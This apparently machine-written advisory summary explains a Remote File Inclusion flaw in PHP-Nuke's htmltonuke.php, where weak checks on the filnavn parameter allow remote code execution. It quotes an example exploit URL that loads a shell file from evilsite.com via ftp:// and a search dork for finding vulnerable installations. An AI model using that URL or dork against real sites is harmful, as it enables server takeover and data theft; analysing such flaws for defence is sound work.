Based on the provided content, here's a breakdown of the vulnerability:

*   **Root Cause:** The vulnerability lies in the `htmltonuke.php` script of the `htmltonuke` module for PHP-Nuke, specifically in how it handles the `filnavn` parameter. The script attempts to prevent directory traversal and inclusion of external files, but these checks are insufficient, allowing for Remote File Inclusion (RFI).

*   **Weaknesses/Vulnerabilities Present:**
    *   **Insufficient Input Validation:** The script checks if the filename ends with ".htm" or ".html", and if it does not start with "./../" or "http://". However, it fails to prevent inclusion of remote files using protocols like "ftp://", as long as the filename ends with the allowed extensions
    *   **Remote File Inclusion (RFI):** Due to the flawed checks, an attacker can supply a remote URL via the `filnavn` parameter, leading to arbitrary code execution by including a malicious file from a remote server.

*   **Impact of Exploitation:**
    *   **Arbitrary Code Execution:** By including a malicious PHP file from a remote server, an attacker can execute arbitrary PHP code on the vulnerable server. This can lead to complete system compromise, data theft, or other malicious activities.

*   **Attack Vectors:**
    *   **HTTP GET Request:** The attacker exploits the vulnerability through a crafted HTTP GET request to `htmltonuke.php`, using the `filnavn` parameter to include a malicious file from a remote server.

*   **Required Attacker Capabilities/Position:**
    *   **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
    *   **External Server:** The attacker needs access to a server to host the malicious PHP file.
    *   **Knowledge of Vulnerable Script:** The attacker needs to know the location of the vulnerable `htmltonuke.php` script and the name of the vulnerable parameter.

**Additional Notes:**

*   The provided content includes an example exploit URL demonstrating how to include a remote file using the `ftp://` protocol: `http://www.example.com/nuke_path/htmltonuke.php?filnavn=ftp://user:pass@evilsite.com/public_html/shell.html`.
*   The exploit was verified by the Exploit Database (EDB).
*   The vulnerability is identified as a Remote File Inclusion (RFI) vulnerability.
*   The content provides a dork: `" /nuke/htmltonuke.php" - "htmltonuke.php"` to find vulnerable installations.
